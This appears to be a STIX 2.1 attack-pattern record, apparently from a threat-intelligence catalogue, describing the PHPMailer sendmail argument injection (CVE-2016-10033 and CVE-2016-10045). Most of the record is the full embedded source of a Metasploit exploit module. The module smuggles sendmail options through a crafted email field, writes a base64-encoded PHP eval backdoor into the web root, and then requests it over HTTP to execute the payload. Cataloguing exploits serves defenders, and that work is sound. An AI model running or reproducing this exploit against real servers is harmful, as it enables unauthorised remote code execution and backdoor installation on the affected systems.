{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6023df4-3296-4dcd-8d9c-c13c8ede4561",
    "created": "2024-08-14T17:08:07.180892Z",
    "modified": "2024-08-14T17:08:07.180896Z",
    "name": "PHPMailer Sendmail Argument Injection",
    "description": " PHPMailer versions up to and including 5.2.19 are affected by a vulnerability which can be leveraged by an attacker to write a file with partially controlled contents to an arbitrary location through injection of arguments that are passed to the sendmail binary. This module writes a payload to the web root of the webserver before then executing it with an HTTP request. The user running PHPMailer must have write access to the specified WEB_ROOT directory and successful exploitation can take a few minutes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpmailer_arg_injection.rb",
            "external_id": "phpmailer_arg_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10033"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10045"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/opsxcq/exploit-CVE-2016-10033"
        },
        {
            "source_name": "reference",
            "url": "https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PHPMailer Sendmail Argument Injection',\n      'Description'    => %q{\n        PHPMailer versions up to and including 5.2.19 are affected by a\n        vulnerability which can be leveraged by an attacker to write a file with\n        partially controlled contents to an arbitrary location through injection\n        of arguments that are passed to the sendmail binary. This module\n        writes a payload to the web root of the webserver before then executing\n        it with an HTTP request. The user running PHPMailer must have write\n        access to the specified WEB_ROOT directory and successful exploitation\n        can take a few minutes.\n      },\n      'Author'         => [\n        'Dawid Golunski',   # vulnerability discovery and original PoC\n        'Spencer McIntyre'  # metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        ['CVE', '2016-10033'],\n        ['CVE', '2016-10045'],\n        ['EDB', '40968'],\n        ['EDB', '40969'],\n        ['URL', 'https://github.com/opsxcq/exploit-CVE-2016-10033'],\n        ['URL', 'https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html']\n      ],\n      'DisclosureDate' => '2016-12-26',\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Payload'        => {'DisableNops' => true},\n      'Targets'        => [\n        ['PHPMailer <5.2.18', {}],\n        ['PHPMailer 5.2.18 - 5.2.19', {}]\n      ],\n      'DefaultTarget'  => 0,\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        },\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',  [true, 'Path to the application root', '/']),\n        OptString.new('TRIGGERURI', [false, 'Path to the uploaded payload', '']),\n        OptString.new('WEB_ROOT',   [true, 'Path to the web root', '/var/www'])\n      ])\n    register_advanced_options(\n      [\n        OptInt.new('WAIT_TIMEOUT', [true, 'Seconds to wait to trigger the payload', 300]),\n        OptString.new('NameField', [true, 'Name of the element for the Name field', 'name'], regex: /^([^\\t\\n\\f \\/>\"'=]+)$/),\n        OptString.new('EmailField', [true, 'Name of the element for the Email field', 'email'], regex: /^([^\\t\\n\\f \\/>\"'=]+)$/),\n        OptString.new('MessageField', [true, 'Name of the element for the Message field', 'message'], regex: /^([^\\t\\n\\f \\/>\"'=]+)$/)\n      ])\n  end\n\n  def trigger(trigger_uri)\n    print_status(\"Sleeping before requesting the payload from: #{trigger_uri}\")\n\n    page_found = false\n    sleep_time = 10\n    wait_time = datastore['WAIT_TIMEOUT']\n    print_status(\"Waiting for up to #{wait_time} seconds to trigger the payload\")\n    while wait_time > 0\n      sleep(sleep_time)\n      wait_time -= sleep_time\n      res = send_request_cgi!(\n        'method'   => 'GET',\n        'uri'      => trigger_uri\n      )\n\n      if res.nil?\n        if page_found or session_created?\n          print_good('Successfully triggered the payload')\n          break\n        end\n\n        next\n      end\n\n      next unless res.code == 200\n\n      if res.body.length == 0 and not page_found\n        print_good('Successfully found the payload')\n        page_found = true\n      end\n    end\n  end\n\n  def exploit\n    name_field = datastore['NameField']\n    email_field = datastore['EmailField']\n    message_field = datastore['MessageField']\n    payload_file_name = \"#{rand_text_alphanumeric(8)}.php\"\n    payload_file_path = \"#{datastore['WEB_ROOT']}/#{payload_file_name}\"\n\n    if target.name == 'PHPMailer <5.2.18'\n      email = \"\\\"#{rand_text_alphanumeric(4 + rand(8))}\\\\\\\" -OQueueDirectory=/tmp -X#{payload_file_path} #{rand_text_alphanumeric(4 + rand(8))}\\\"@#{rand_text_alphanumeric(4 + rand(8))}.com\"\n    elsif target.name == 'PHPMailer 5.2.18 - 5.2.19'\n      email = \"\\\"#{rand_text_alphanumeric(4 + rand(8))}\\\\' -OQueueDirectory=/tmp -X#{payload_file_path} #{rand_text_alphanumeric(4 + rand(8))}\\\"@#{rand_text_alphanumeric(4 + rand(8))}.com\"\n    else\n      fail_with(Failure::NoTarget, 'The specified version is not supported')\n    end\n\n    data = Rex::MIME::Message.new\n    data.add_part('submit', nil, nil, 'form-data; name=\"action\"')\n    data.add_part(\"<?php eval(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}')); ?>\", nil, nil, \"form-data; name='#{name_field}'\")\n    data.add_part(email, nil, nil, \"form-data; name='#{email_field}'\")\n    data.add_part(\"#{rand_text_alphanumeric(2 + rand(20))}\", nil, nil, \"form-data; name='#{message_field}'\")\n\n    print_status(\"Writing the backdoor to #{payload_file_path}\")\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri),\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => data.to_s\n    )\n\n    register_files_for_cleanup(payload_file_path)\n\n    trigger(normalize_uri(datastore['TRIGGERURI'].blank? ? target_uri : datastore['TRIGGERURI'], payload_file_name))\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-26",
    "x_mitre_platforms": [
        "php'"
    ]
}